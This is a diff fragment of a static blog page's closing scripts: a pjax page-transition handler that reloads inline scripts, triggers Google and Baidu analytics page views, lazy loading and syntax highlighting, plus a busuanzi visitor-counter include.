+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
